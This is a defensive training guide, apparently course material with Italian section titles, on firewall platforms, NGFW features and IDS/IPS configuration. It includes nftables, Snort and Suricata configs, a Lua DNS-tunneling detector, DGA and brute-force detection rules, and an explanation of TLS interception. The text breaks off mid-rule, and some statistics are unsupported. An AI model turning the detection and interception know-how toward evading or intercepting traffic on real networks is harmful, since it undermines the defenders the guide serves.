# 28 — Firewall Management, IDS/IPS Architecture, and Network Security Operations

---

## Indice

1. [Fondamenti Firewall](#1-fondamenti-firewall)
2. [Piattaforme Enterprise](#2-piattaforme-enterprise)
3. [Next-Generation Firewall Features](#3-next-generation-firewall-features)
4. [Intrusion Detection Systems](#4-intrusion-detection-systems)
5. [Intrusion Prevention Systems](#5-intrusion-prevention-systems)
6. [Rule Engineering e Detection](#6-rule-engineering-e-detection)
7. [Network Segmentation Strategy](#7-network-segmentation-strategy)
8. [Evasione e Bypass — Red Team Perspective](#8-evasione-e-bypass--red-team-perspective)
9. [Monitoraggio e Tuning Operativo](#9-monitoraggio-e-tuning-operativo)
10. [Laboratorio Pratico](#10-laboratorio-pratico)

---

## 1. Fondamenti Firewall

### 1.1 Classificazione per Generazione

#### Stateless Packet Filters (1st Generation)

Stateless firewalls examine each packet in isolation. They inspect Layer 3/4 headers — source/destination IP, ports, protocol number, TCP flags — without maintaining any knowledge of connection state. Every packet is evaluated independently against the ruleset.

**Operational characteristics:**

- No memory of previous packets; each frame is judged on its own headers
- Extremely fast — wire-speed processing on commodity hardware
- Cannot detect session hijacking, out-of-state packets, or fragmentation attacks
- ACL-style rules: permit/deny based on 5-tuple (src IP, dst IP, src port, dst port, protocol)

**When stateless still makes sense:**

- High-throughput backbone routers where DDoS mitigation requires line-rate filtering
- Pre-filter stages before stateful inspection (reduce load on stateful engine)
- Simple inter-VLAN ACLs in environments with flat security posture

#### Stateful Inspection (2nd Generation)

Stateful firewalls maintain a **connection tracking table** (conntrack) that records the state of every active session. When a SYN arrives, the firewall creates an entry; subsequent packets matching that session are fast-tracked without full rule re-evaluation.

**Connection tracking table structure (Linux conntrack example):**

```
tcp  6 431999 ESTABLISHED src=10.0.1.50 dst=203.0.113.10 sport=44312 dport=443
     packets=847 bytes=1245632 src=203.0.113.10 dst=10.0.1.50 sport=443 dport=44312
     packets=623 bytes=89452 [ASSURED] mark=0 use=1
```

Key fields: protocol, timeout, state (NEW/ESTABLISHED/RELATED/INVALID), original tuple, reply tuple, byte/packet counters, assurance flag.

**State machine for TCP:**

```
NEW       → SYN sent, no reply yet
SYN_RECV  → SYN+ACK received
ESTABLISHED → Three-way handshake complete
FIN_WAIT  → FIN seen from one side
CLOSE_WAIT → FIN seen from both sides
TIME_WAIT → Session in cool-down (default 120s)
```

**Connection table exhaustion attack:** An attacker floods the firewall with half-open connections, exhausting conntrack entries. Mitigation: SYN cookies, aggressive timeout for SYN_RECV state, hardware-assisted conntrack with millions of entries.

#### Application-Layer Gateways (3rd Generation / NGFW)

Application-layer firewalls reassemble the full Layer 7 payload and apply protocol-specific parsing. They understand HTTP semantics, DNS query structures, SMB commands, and can make decisions based on application-level content.

**Capabilities beyond L3/L4:**

- Identify applications regardless of port (e.g., BitTorrent on port 443)
- Inspect encrypted traffic via TLS interception (forward proxy mode)
- Apply granular policies: allow Slack messaging but block file uploads
- Detect malware in file transfers via sandboxing integration
- User-identity-based policies (AD/LDAP integration)

### 1.2 Rule Processing Logic

#### First-Match (Top-Down)

Used by: iptables, pfSense, Cisco ASA, Palo Alto (within a rule section).

Rules are evaluated sequentially from top to bottom. The first rule that matches the packet determines the action. Once matched, no further rules are consulted.

**Implications for rule ordering:**

1. Most specific rules go first
2. More general rules follow
3. Implicit deny-all at the bottom (if not explicitly stated)
4. A misplaced broad permit above a specific deny renders the deny unreachable

#### Best-Match (Longest Prefix)

Used by: routing tables, some zone-based engines for route-domain lookups.

The most specific matching rule wins regardless of position. This is more forgiving for rule placement but can be harder to audit.

#### Policy Shadowing

A rule is **shadowed** when a preceding rule matches all traffic the shadowed rule would match. Shadowed rules are dead code — they never fire.

```
Rule 10: permit tcp any any eq 443     ← matches all HTTPS
Rule 20: deny tcp 10.0.0.0/8 any eq 443  ← SHADOWED, never fires
```

Detection: compare each rule's match space against the union of all preceding rules. Tools like Nipper and FireMon automate this analysis.

### 1.3 Zone-Based Firewall Design

Zone-based design assigns interfaces to security zones and defines inter-zone policies. Traffic within a zone is implicitly permitted; traffic between zones requires explicit policy.

**Common zones:**

| Zone | Purpose | Trust Level |
|------|---------|-------------|
| INSIDE | Internal corporate network | High |
| OUTSIDE | Internet-facing | Untrusted |
| DMZ | Publicly accessible servers | Medium |
| GUEST | Visitor/BYOD network | Low |
| MANAGEMENT | Network device administration | Highest |
| IOT | Smart devices, OT systems | Very Low |

**Inter-zone traffic matrix (example):**

```
FROM \ TO    | INSIDE | DMZ    | OUTSIDE | MGMT
-------------|--------|--------|---------|------
INSIDE       | allow  | allow  | allow*  | deny
DMZ          | deny   | deny   | allow*  | deny
OUTSIDE      | deny   | allow* | deny    | deny
MGMT         | allow  | allow  | deny    | allow

* = with inspection/policy constraints
```

### 1.4 DMZ Architecture Patterns

#### Single-Firewall DMZ (Three-Legged)

One firewall with three interfaces: outside, inside, DMZ. Cost-effective but the firewall is a single point of failure and compromise.

```
Internet ─── [FW outside] ─── [FW inside] ─── Internal LAN
                   │
              [FW DMZ]
                   │
            Web/Mail/DNS Servers
```

#### Dual-Firewall DMZ (Sandwich)

Two firewalls create a screened subnet. The external firewall permits Internet→DMZ; the internal firewall permits DMZ→Internal on specific flows only.

```
Internet ─── [External FW] ─── DMZ ─── [Internal FW] ─── Internal LAN
```

**Advantage:** Even if the external firewall is compromised, the internal firewall provides defense-in-depth. Best practice: use different vendors for the two firewalls to prevent a single CVE from compromising both layers.

#### Multi-Tier DMZ

Separate DMZ tiers for different exposure levels:

- **Tier 1 (Public):** Web servers, reverse proxies, WAFs
- **Tier 2 (Application):** Application servers, API gateways
- **Tier 3 (Data):** Database servers, accessible only from Tier 2

Each tier is a separate zone with progressively tighter policies.

### 1.5 Implicit Deny Principle

Every firewall policy ends with an implicit `deny all` (also called "cleanup rule"). This is the cornerstone of least-privilege network access:

- If traffic doesn't match any explicit permit rule, it is dropped
- The implicit deny should always be the last rule
- Log the implicit deny hits — they reveal misconfigured applications, reconnaissance, or lateral movement attempts
- Never place an explicit `permit any any` above the cleanup rule in production

---

## 2. Piattaforme Enterprise

### 2.1 pfSense / OPNsense — Configuration Deep Dive

#### Architecture Overview

pfSense is a FreeBSD-based firewall/router distribution. It uses pf (packet filter) as its core filtering engine, with a PHP-based web interface for configuration. OPNsense is a fork with a modern UI (based on Phalcon/MVC), improved security hardening, and a plugin architecture.

**Core components:**

- `pf` — stateful packet filter (kernel-level)
- `pfctl` — pf control utility
- `dhcpd` — ISC DHCP for address management
- `unbound` — DNS resolver with DNSSEC
- `strongSwan` / `OpenVPN` — VPN subsystems
- `suricata` / `snort` — inline IDS/IPS packages
- `haproxy` — load balancer / reverse proxy

#### Rule Configuration (XML)

pfSense stores its configuration in `/cf/conf/config.xml`. The filter rules section:

```xml
<filter>
  <rule>
    <id></id>
    <tracker>1620000001</tracker>
    <type>pass</type>
    <interface>wan</interface>
    <ipprotocol>inet</ipprotocol>
    <tag></tag>
    <tagged></tagged>
    <max></max>
    <max-src-nodes></max-src-nodes>
    <max-src-conn></max-src-conn>
    <max-src-states></max-src-states>
    <statetimeout></statetimeout>
    <statetype>keep state</statetype>
    <os></os>
    <protocol>tcp</protocol>
    <source>
      <any></any>
    </source>
    <destination>
      <address>10.0.1.100</address>
      <port>443</port>
    </destination>
    <descr><![CDATA[Allow HTTPS to web server]]></descr>
  </rule>
  
  <rule>
    <id></id>
    <tracker>1620000002</tracker>
    <type>pass</type>
    <interface>lan</interface>
    <ipprotocol>inet</ipprotocol>
    <protocol>tcp</protocol>
    <source>
      <network>lan</network>
    </source>
    <destination>
      <any></any>
    </destination>
    <descr><![CDATA[LAN to any — outbound]]></descr>
  </rule>

  <rule>
    <id></id>
    <tracker>1620000003</tracker>
    <type>block</type>
    <interface>wan</interface>
    <ipprotocol>inet46</ipprotocol>
    <source>
      <any></any>
    </source>
    <destination>
      <any></any>
    </destination>
    <log></log>
    <descr><![CDATA[Default deny WAN inbound]]></descr>
  </rule>
</filter>
```

#### Floating Rules

Floating rules are processed before interface-specific rules and can match on multiple interfaces simultaneously. Use cases:

- Blocking known-bad IPs across all interfaces
- QoS/traffic shaping rules that span zones
- Geo-blocking via pfBlockerNG alias references

#### pfBlockerNG Configuration

```xml
<pfblockerng>
  <config>
    <enable>on</enable>
    <dnsbl>on</dnsbl>
    <dnsbl_port>8081</dnsbl_port>
    <dnsbl_cert>on</dnsbl_cert>
    <maxmind_key>YOUR_KEY_HERE</maxmind_key>
  </config>
  <ipv4>
    <rule>
      <aliasname>PRI1_Threats</aliasname>
      <url>https://rules.emergingthreats.net/fwrules/emerging-Block-IPs.txt</url>
      <action>Deny_Inbound</action>
      <updatefreq>4</updatefreq>
    </rule>
  </ipv4>
</pfblockerng>
```

### 2.2 Palo Alto Networks — App-ID / Content-ID / User-ID / WildFire

#### App-ID Architecture

App-ID identifies applications through a multi-step classification engine:

1. **Protocol decoding** — determine L4 protocol and known port usage
2. **Application signatures** — match traffic patterns against 3000+ application signatures
3. **SSL decryption** — decrypt TLS to inspect inner application
4. **Heuristic analysis** — behavioral patterns for unknown traffic

App-ID operates continuously: if an application changes mid-session (e.g., HTTP upgrades to WebSocket), the classification updates and the new policy applies.

#### Content-ID

Content-ID provides:

- **Threat prevention:** IPS signatures, anti-malware, vulnerability protection profiles
- **URL filtering:** PAN-DB with 80+ categories, custom URL categories
- **File blocking:** by type, direction, application context
- **Data filtering:** regex-based DLP for credit card numbers, SSNs, custom patterns

#### User-ID

Maps IP addresses to usernames via:

- Active Directory domain controller logs (Security Event ID 4624)
- LDAP/Kerberos queries
- Captive portal for guest networks
- GlobalProtect agent on endpoints
- XML API for custom integrations

Policy rules then reference user groups instead of IP addresses:

```
Rule: Allow "Marketing-Group" → social-media-apps → Internet
Rule: Deny "All-Users" → peer-to-peer → Any
```

#### WildFire Sandbox

Unknown files are submitted to WildFire for analysis:

1. Static analysis — PE header inspection, embedded URLs, packer detection
2. Dynamic analysis — executed in a sandbox (Windows, macOS, Android, Linux)
3. Machine learning — classification based on file features
4. Bare-metal analysis — for sandbox-aware malware

Verdict delivered in ~5 minutes; signature generation within 5 minutes of conviction.

### 2.3 Fortinet FortiGate — Security Fabric / VDOM

#### Security Fabric Architecture

The Fortinet Security Fabric connects:

- **FortiGate** — NGFW (anchor)
- **FortiAnalyzer** — centralized logging and reporting
- **FortiManager** — centralized policy management
- **FortiSandbox** — on-premise sandboxing
- **FortiClient** — endpoint agent (telemetry, VPN)
- **FortiSwitch / FortiAP** — network access layer

Fabric connectors share threat intelligence across all components. A malware detection on FortiSandbox triggers automatic quarantine on FortiClient endpoints within seconds.

#### Virtual Domains (VDOM)

VDOMs partition a single FortiGate into multiple virtual firewalls:

- Separate routing tables, policies, VPN configurations
- Resource allocation (CPU, memory, session limits) per VDOM
- Inter-VDOM links for controlled traffic between virtual instances
- Use case: multi-tenant environments, separating IT/OT networks on one appliance

```
config vdom
  edit "CORPORATE"
  next
  edit "GUEST"
  next
  edit "OT_SCADA"
  next
end

config system interface
  edit "port1"
    set vdom "CORPORATE"
    set ip 10.1.0.1/24
  next
  edit "port2"
    set vdom "GUEST"
    set ip 10.2.0.1/24
  next
end
```

### 2.4 Cisco ASA / Firepower — FTD Architecture

#### Firepower Threat Defense (FTD)

FTD unifies the ASA stateful firewall with the Firepower NGIPS engine in a single image:

- **Lina engine** — ASA heritage: stateful inspection, NAT, VPN, routing
- **Snort engine** — IPS, application detection, file inspection
- **Firepower Management Center (FMC)** — centralized management UI

Packet flow in FTD:

```
Ingress → Lina (ACL check) → Snort (deep inspection) → Lina (NAT/routing) → Egress
```

If Snort determines the traffic is malicious, it signals Lina to drop the flow.

#### Security Intelligence

FTD integrates Cisco Talos threat feeds:

- IP reputation (known C2, botnets, scanners)
- URL reputation and categorization
- DNS-based blocking (prevent resolution of malicious domains)
- File reputation (SHA-256 lookups against AMP cloud)

### 2.5 Check Point — SmartConsole / Policy Layers / Inspection Points

#### Policy Layers

Check Point uses an ordered-layer architecture:

1. **Network layer** — traditional firewall rules (src/dst/service/action)
2. **Application & URL Filtering layer** — App Control, URLF categories
3. **Content Awareness layer** — file type identification, DLP
4. **Threat Prevention layer** — IPS, Anti-Bot, Anti-Virus, SandBlast

Each layer is processed in sequence. A packet must pass all layers to be permitted.

#### Inspection Points

Check Point performs inspection at multiple points:

- **Before NAT** — rules see original addresses
- **After NAT** — rules see translated addresses
- **Kernel-level** (SecureXL) — hardware-accelerated path for known-good flows
- **Medium path** — partial inspection for established connections
- **Firewall path (F2F)** — full inspection for new connections

#### SmartConsole Object Model

```
# Host object
host "WebServer01" {
    ipv4-address: 10.0.1.100
    color: "blue"
    tags: ["DMZ", "Production"]
}

# Network object
network "Internal_LAN" {
    subnet: 10.0.0.0
    mask-length: 16
}

# Service object
service-tcp "HTTPS_Custom" {
    port: 8443
    session-timeout: 3600
}

# Rule
rule {
    name: "Allow Internal to DMZ Web"
    source: ["Internal_LAN"]
    destination: ["WebServer01"]
    service: ["https", "HTTPS_Custom"]
    action: "Accept"
    track: "Log"
    layer: "Network"
}
```

### 2.6 Linux iptables / nftables — Enterprise Rulesets

#### nftables Complete Enterprise Configuration

```bash
#!/usr/sbin/nft -f

# Flush existing rules
flush ruleset

# Define variables
define LAN_NET = 10.0.0.0/16
define DMZ_NET = 172.16.0.0/24
define MGMT_NET = 10.99.0.0/24
define DNS_SERVERS = { 10.0.1.10, 10.0.1.11 }
define MAIL_SERVER = 172.16.0.25
define WEB_SERVERS = { 172.16.0.80, 172.16.0.81 }
define BOGONS = { 0.0.0.0/8, 10.0.0.0/8, 100.64.0.0/10, 127.0.0.0/8,
                  169.254.0.0/16, 172.16.0.0/12, 192.0.0.0/24, 192.0.2.0/24,
                  192.168.0.0/16, 198.18.0.0/15, 198.51.100.0/24,
                  203.0.113.0/24, 224.0.0.0/4, 240.0.0.0/4 }

table inet filter {
    # Connection tracking
    chain ct_state {
        ct state established,related accept
        ct state invalid drop
    }

    # Rate limiting sets
    set rate_limit_ssh {
        type ipv4_addr
        flags dynamic,timeout
        timeout 5m
    }

    set rate_limit_http {
        type ipv4_addr
        flags dynamic,timeout
        timeout 1m
    }

    # Blacklist (populated by fail2ban or threat intel feeds)
    set blacklist_v4 {
        type ipv4_addr
        flags interval
        auto-merge
    }

    set blacklist_v6 {
        type ipv6_addr
        flags interval
        auto-merge
    }

    chain input {
        type filter hook input priority 0; policy drop;

        # Loopback
        iif lo accept

        # Connection tracking
        jump ct_state

        # Drop blacklisted sources
        ip saddr @blacklist_v4 counter drop
        ip6 saddr @blacklist_v6 counter drop

        # Anti-spoofing: drop packets with bogon sources on WAN
        iifname "eth0" ip saddr $BOGONS counter drop

        # ICMP rate limiting
        ip protocol icmp icmp type echo-request \
            limit rate 5/second burst 10 packets accept
        ip protocol icmp icmp type { destination-unreachable, \
            time-exceeded, parameter-problem } accept

        # ICMPv6 (required for IPv6 operation)
        ip6 nexthdr icmpv6 icmpv6 type { \
            destination-unreachable, packet-too-big, \
            time-exceeded, parameter-problem, \
            nd-router-advert, nd-neighbor-solicit, \
            nd-neighbor-advert } accept

        # SSH from management network only
        iifname "eth2" ip saddr $MGMT_NET tcp dport 22 \
            ct state new \
            add @rate_limit_ssh { ip saddr limit rate 3/minute burst 5 packets } \
            accept

        # DNS from internal
        iifname "eth1" ip saddr $LAN_NET tcp dport 53 accept
        iifname "eth1" ip saddr $LAN_NET udp dport 53 accept

        # DHCP
        iifname "eth1" udp dport { 67, 68 } accept

        # Monitoring (SNMP, node_exporter)
        iifname "eth2" ip saddr $MGMT_NET tcp dport 9100 accept
        iifname "eth2" ip saddr $MGMT_NET udp dport 161 accept

        # Log and drop everything else
        counter log prefix "[nft-INPUT-DROP] " flags all
        drop
    }

    chain forward {
        type filter hook forward priority 0; policy drop;

        # Connection tracking
        jump ct_state

        # LAN → Internet (outbound)
        iifname "eth1" oifname "eth0" ip saddr $LAN_NET accept

        # LAN → DMZ (limited services)
        iifname "eth1" oifname "eth3" ip saddr $LAN_NET \
            ip daddr $DMZ_NET tcp dport { 80, 443, 22 } accept

        # Internet → DMZ (inbound services)
        iifname "eth0" oifname "eth3" ip daddr $WEB_SERVERS \
            tcp dport { 80, 443 } \
            ct state new \
            add @rate_limit_http { ip saddr limit rate 100/second burst 200 packets } \
            accept

        iifname "eth0" oifname "eth3" ip daddr $MAIL_SERVER \
            tcp dport { 25, 587, 993 } accept

        # DMZ → Internet (updates, DNS)
        iifname "eth3" oifname "eth0" ip saddr $DMZ_NET \
            tcp dport { 80, 443 } accept
        iifname "eth3" oifname "eth0" ip saddr $DMZ_NET \
            udp dport 53 accept

        # DMZ → LAN: DENY (critical — prevents lateral movement)
        iifname "eth3" oifname "eth1" counter log prefix "[nft-DMZ-TO-LAN] " drop

        # Log and drop
        counter log prefix "[nft-FORWARD-DROP] " flags all
        drop
    }

    chain output {
        type filter hook output priority 0; policy accept;

        # Allow established
        ct state established,related accept

        # Allow specific outbound from firewall itself
        tcp dport { 53, 80, 443, 123 } accept
        udp dport { 53, 123, 514 } accept

        # Syslog to SIEM
        ip daddr 10.99.0.50 tcp dport 1514 accept
    }
}

table inet nat {
    chain prerouting {
        type nat hook prerouting priority -100; policy accept;

        # DNAT inbound HTTPS to web servers (round-robin)
        iifname "eth0" tcp dport 443 dnat to numgen inc mod 2 map { \
            0 : 172.16.0.80, 1 : 172.16.0.81 }

        # DNAT inbound SMTP to mail server
        iifname "eth0" tcp dport 25 dnat to $MAIL_SERVER
    }

    chain postrouting {
        type nat hook postrouting priority 100; policy accept;

        # Masquerade LAN and DMZ outbound
        oifname "eth0" ip saddr $LAN_NET masquerade
        oifname "eth0" ip saddr $DMZ_NET masquerade
    }
}
```

---

## 3. Next-Generation Firewall Features

### 3.1 Application-Level Inspection

NGFW application identification transcends port-based classification. The engine:

1. Decodes the initial handshake (TLS Client Hello SNI, HTTP Host header)
2. Applies pattern matching against known application signatures
3. Tracks behavioral characteristics (packet timing, payload structure)
4. Reclassifies mid-stream if the application changes

**Example:** A user connects to port 443. Traditional firewall sees "HTTPS — permitted." NGFW identifies it as:
- Zoom meeting (allowed during business hours)
- BitTorrent over TLS (blocked by policy)
- Tor bridge connection (blocked + security incident generated)

### 3.2 SSL/TLS Decryption

#### Forward Proxy (Outbound Decryption)

The firewall acts as a man-in-the-middle for outbound TLS:

1. Client initiates TLS to `example.com`
2. Firewall intercepts, generates a spoofed certificate for `example.com` signed by its internal CA
3. Client trusts the certificate (internal CA pushed via GPO/MDM)
4. Firewall establishes a separate TLS session to the real `example.com`
5. Plaintext is inspected between the two TLS sessions

**Deployment requirements:**

- Internal CA certificate deployed to all endpoints (GPO, MDM, SCEP)
- Certificate pinning exceptions for applications that reject the internal CA (banking apps, Microsoft 365 agents)
- Decrypt exemption lists for privacy-sensitive categories (healthcare, banking, HR)

#### Inbound Inspection

The firewall holds the real server's private key (or an HSM reference):

1. External client connects to the firewall's public IP
2. Firewall terminates TLS using the server's actual certificate
3. Firewall inspects plaintext
4. Firewall re-encrypts and forwards to the backend server (or sends plaintext internally)

### 3.3 URL Filtering Categories

Enterprise URL filtering typically provides 80-100+ categories:

- Adult content, gambling, weapons
- Malware, phishing, C2 domains
- Cloud storage, webmail, social media
- Streaming media, gaming
- Newly registered domains (high risk — 70% of NRDs are malicious)
- Parked/expired domains
- Dynamic DNS (frequently used for C2)
- Uncategorized (default deny or additional scrutiny)

**Best practice:** Block uncategorized and newly registered domains by default. This single policy catches a significant percentage of phishing and C2 traffic.

### 3.4 Threat Intelligence Feeds Integration

NGFWs consume external threat intelligence:

| Feed Type | Examples | Update Frequency |
|-----------|----------|-----------------|
| IP blocklists | ET Compromised IPs, Abuse.ch | Every 5 min |
| Domain blocklists | PhishTank, URLhaus | Every 15 min |
| TLS certificate hashes | JA3/JA3S fingerprints | Hourly |
| File hashes (IOCs) | VirusTotal, MISP | Near real-time |
| STIX/TAXII feeds | ISAC feeds, government CERT | Varies |

### 3.5 Sandboxing Unknown Files

Files not matching known signatures are detonated in isolation:

1. **Pre-filter:** File type, size, source reputation
2. **Static analysis:** Entropy, embedded strings, PE imports, macro extraction
3. **Dynamic analysis:** Execute in instrumented VM, monitor API calls, network behavior, file system changes, registry modifications
4. **Verdict:** Clean / Suspicious / Malicious
5. **Action:** If malicious, create signature, push to all firewalls within minutes

### 3.6 DNS Security

DNS is the most abused protocol for C2 and data exfiltration. NGFW DNS security:

- Block resolution of known-malicious domains (sinkhole to internal IP)
- Detect DNS tunneling via entropy analysis and query length anomalies
- Block direct DNS (port 53) to external resolvers — force use of corporate DNS
- Monitor TXT record queries (commonly used for C2 payloads)
- Detect DGA (Domain Generation Algorithm) domains via ML classification

### 3.7 IoT Device Identification

Modern NGFWs fingerprint IoT devices via:

- DHCP option 55 fingerprinting
- HTTP User-Agent strings
- mDNS/SSDP service announcements
- MAC OUI vendor identification
- Behavioral profiling (traffic patterns, destinations)

Once identified, micro-policies are applied: a security camera should only stream to the NVR, not initiate outbound connections to the Internet.

---

## 4. Intrusion Detection Systems

### 4.1 NIDS vs HIDS Architecture

#### Network-Based IDS (NIDS)

Monitors network traffic at strategic points:

- **Passive tap/SPAN port:** receives a copy of traffic without being inline
- **Visibility:** sees all east-west and north-south traffic at the sensor location
- **Limitations:** encrypted traffic (without decryption), cannot see host-level events
- **Deployment points:** core switch SPAN, network taps at perimeter, between zones

#### Host-Based IDS (HIDS)

Runs on individual hosts and monitors:

- File integrity (detect unauthorized changes to system files)
- Log analysis (parse syslog, auth.log, Windows Event Log)
- Rootkit detection (check for hidden processes, network ports)
- System call monitoring (detect anomalous process behavior)
- Registry monitoring (Windows)

#### Hybrid Architecture

Best practice deploys both:

```
Internet → [NIDS at perimeter] → Firewall → [NIDS inter-zone] → Servers [HIDS on each]
                                                                   ↓
                                                           [SIEM aggregation]
```

### 4.2 Snort 3 — Architecture and Configuration

#### Snort 3 Architecture

Snort 3 (complete rewrite from Snort 2.x) features:

- **Multi-threaded packet processing** — scales across CPU cores
- **Hyperscan pattern matching** — Intel regex engine for wire-speed DPI
- **Pluggable inspectors** — modular protocol analyzers
- **Shared configuration** — single config file (Lua-based) vs. multiple .conf files
- **DAQ (Data Acquisition)** — abstraction layer for different capture methods (AF_PACKET, PF_RING, DPDK)

#### Snort 3 Configuration (snort.lua)

```lua
-- snort.lua - Snort 3 main configuration

-- Network variables
HOME_NET = '10.0.0.0/8'
EXTERNAL_NET = '!$HOME_NET'

-- DAQ configuration
daq = {
    module_dirs = { '/usr/lib/daq/' },
    modules = {
        {
            name = 'afpacket',
            mode = 'inline',
            variables = {
                'buffer_size_mb=256',
                'fanout_type=hash'
            }
        }
    }
}

-- Decoder configuration
normalizer = {
    tcp = {
        ips = true,
        trim = true
    }
}

-- Stream configuration (connection tracking)
stream = {
    tcp_cache = { max_sessions = 500000 },
    udp_cache = { max_sessions = 200000 }
}
stream_tcp = {
    policy = 'linux',
    session_timeout = 180,
    max_window = 0,
    overlap_limit = 10,
    max_pdu = 16384
}

-- HTTP inspector
http_inspect = {
    request_depth = 65535,
    response_depth = 65535,
    unzip = true,
    normalize_javascript = true
}

-- File identification and processing
file_id = {
    rules_file = '/etc/snort/file_magic.rules',
    enable_type = true,
    enable_signature = true,
    file_depth = 10485760  -- 10MB
}

-- IPS configuration
ips = {
    enable_builtin_rules = true,
    include = '/etc/snort/rules/snort3-community.rules',
    variables = {
        nets = {
            HOME_NET = HOME_NET,
            EXTERNAL_NET = EXTERNAL_NET,
            DNS_SERVERS = '$HOME_NET',
            HTTP_SERVERS = '172.16.0.0/24',
            SQL_SERVERS = '10.0.2.0/24'
        },
        ports = {
            HTTP_PORTS = '80 8080 8443',
            SSH_PORTS = '22',
            DNS_PORTS = '53'
        }
    }
}

-- Logging and output
alert_json = {
    file = true,
    limit = 100,
    fields = 'timestamp pkt_num proto pkt_gen pkt_len dir src_addr src_port dst_addr dst_port action msg rule priority class_desc'
}

-- Performance tuning
search_engine = {
    search_method = 'hyperscan',
    split_any_any = true
}

-- Reputation preprocessor
reputation = {
    blacklist = '/etc/snort/reputation/blacklist.txt',
    whitelist = '/etc/snort/reputation/whitelist.txt',
    memcap = 500,
    scan_local = true
}
```

### 4.3 Suricata — Multi-Threading and EVE JSON

#### Architecture

Suricata processes packets through a pipeline:

1. **Capture threads** — pull packets from interfaces (AF_PACKET, PF_RING, DPDK)
2. **Decode threads** — protocol parsing
3. **Stream reassembly** — TCP reassembly engine
4. **Detection threads** — rule matching (multi-threaded)
5. **Output threads** — logging

Each thread type scales independently. On a 16-core system, a typical allocation:

- 2 capture threads (one per interface in inline mode)
- 12 detection threads
- 1 management thread
- 1 output thread

#### suricata.yaml Key Configuration

```yaml
%YAML 1.1
---

vars:
  address-groups:
    HOME_NET: "[10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16]"
    EXTERNAL_NET: "!$HOME_NET"
    HTTP_SERVERS: "$HOME_NET"
    DNS_SERVERS: "[10.0.1.10, 10.0.1.11]"
    SQL_SERVERS: "[10.0.2.0/24]"
  port-groups:
    HTTP_PORTS: "80"
    SHELLCODE_PORTS: "!80"
    SSH_PORTS: "22"

# Capture configuration
af-packet:
  - interface: eth0
    threads: 4
    cluster-id: 99
    cluster-type: cluster_flow
    defrag: yes
    use-mmap: yes
    ring-size: 200000
    buffer-size: 1048576
    tpacket-v3: yes

# Multi-threading
threading:
  set-cpu-affinity: yes
  cpu-affinity:
    - management-cpu-set:
        cpu: [0]
    - receive-cpu-set:
        cpu: [1, 2]
    - worker-cpu-set:
        cpu: [3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
        mode: "exclusive"

# Detection engine
detect:
  profile: high
  custom-values:
    toclient-groups: 50
    toserver-groups: 50
  sgh-mpm-context: auto
  inspection-recursion-limit: 3000

# Stream engine
stream:
  memcap: 4gb
  checksum-validation: no
  reassembly:
    memcap: 8gb
    depth: 1mb
    toserver-chunk-size: 2560
    toclient-chunk-size: 2560
    randomize-chunk-size: yes

# EVE JSON logging
outputs:
  - eve-log:
      enabled: yes
      filetype: regular
      filename: /var/log/suricata/eve.json
      pcap-file: false
      community-id: true
      community-id-seed: 0
      types:
        - alert:
            payload: yes
            payload-buffer-size: 4kb
            payload-printable: yes
            packet: yes
            metadata: yes
            tagged-packets: yes
        - anomaly:
            enabled: yes
            types:
              decode: yes
              stream: yes
              applayer: yes
        - http:
            extended: yes
        - dns:
            query: yes
            answer: yes
        - tls:
            extended: yes
        - files:
            force-magic: yes
            force-hash: [md5, sha256]
        - smtp:
            extended: yes
        - flow
        - netflow
        - stats:
            totals: yes
            threads: no
```

#### Suricata Lua Scripting

```lua
-- /etc/suricata/lua-scripts/dns-tunnel-detect.lua
-- Detect potential DNS tunneling by query entropy and length

function init(args)
    local needs = {}
    needs["dns.rrname"] = tostring(true)
    return needs
end

function match(args)
    local query = tostring(args["dns.rrname"])
    
    if query == nil then
        return 0
    end
    
    -- Check query length (tunneling uses long labels)
    if #query > 60 then
        -- Calculate Shannon entropy
        local freq = {}
        for i = 1, #query do
            local c = query:sub(i, i)
            freq[c] = (freq[c] or 0) + 1
        end
        
        local entropy = 0
        local len = #query
        for _, count in pairs(freq) do
            local p = count / len
            entropy = entropy - p * math.log(p) / math.log(2)
        end
        
        -- High entropy + long query = likely tunneling
        if entropy > 3.5 then
            return 1
        end
    end
    
    return 0
end
```

#### Suricata Datasets

Datasets allow matching against large lists efficiently:

```yaml
# In suricata.yaml
datasets:
  rules:
    - tor-exit-nodes:
        type: ipv4
        load: /etc/suricata/datasets/tor-exits.lst
    - dga-domains:
        type: string
        load: /etc/suricata/datasets/dga-domains.lst
        memcap: 100mb
        hashsize: 1048576
```

Corresponding rule:

```
alert dns $HOME_NET any -> any 53 (msg:"DNS query to known DGA domain"; \
    dns.query; dataset:isset,dga-domains,type string,load /etc/suricata/datasets/dga-domains.lst; \
    classtype:trojan-activity; sid:3000001; rev:1;)
```

### 4.4 OSSEC / Wazuh — Agent-Based Detection

#### Wazuh Architecture

```
                    ┌──────────────────┐
                    │  Wazuh Dashboard │ (OpenSearch Dashboards)
                    └────────┬─────────┘
                             │
                    ┌────────▼─────────┐
                    │  Wazuh Indexer   │ (OpenSearch cluster)
                    └────────┬─────────┘
                             │
                    ┌────────▼─────────┐
                    │  Wazuh Manager   │ (ossec-analysisd, ossec-remoted)
                    └────────┬─────────┘
                             │
          ┌──────────┬───────┼───────┬──────────┐
          │          │       │       │          │
     ┌────▼───┐ ┌───▼───┐ ┌─▼──┐ ┌──▼──┐ ┌────▼───┐
     │Agent 1 │ │Agent 2│ │ .. │ │ .. │  │Agent N │
     │(Linux) │ │(Win)  │ │    │ │    │  │(macOS) │
     └────────┘ └───────┘ └────┘ └────┘  └────────┘
```

**Key detection capabilities:**

- File integrity monitoring (FIM) — SHA-256 hashes of critical files
- Log collection and analysis — multi-format log parsing
- Rootcheck — scan for rootkits, trojans, hidden processes
- SCA (Security Configuration Assessment) — CIS benchmark compliance
- Vulnerability detection — CVE matching against installed packages
- Active response — automated actions on threat detection

#### Wazuh Custom Rule Example

```xml
<!-- /var/ossec/etc/rules/local_rules.xml -->
<group name="local,authentication,">

  <!-- Detect brute force: 5 failed logins in 60 seconds -->
  <rule id="100001" level="10" frequency="5" timeframe="60">
    <if_matched_sid>5503</if_matched_sid>
    <same_source_ip />
    <description>Brute force attack detected from $(srcip)</description>
    <mitre>
      <id>T1110</id>
    </mitre>
    <group>authentication_failures,brute_force,</group>
  </rule>

  <!-- Detect lateral movement: admin login from unexpected source -->
  <rule id="100002" level="12">
    <if_sid>5715</if_sid>
    <user>root|admin|administrator</user>
    <srcip>!10.99.0.0/24</srcip>
    <description>Privileged login from non-management subnet $(srcip)</description>
    <mitre>
      <id>T1021</id>
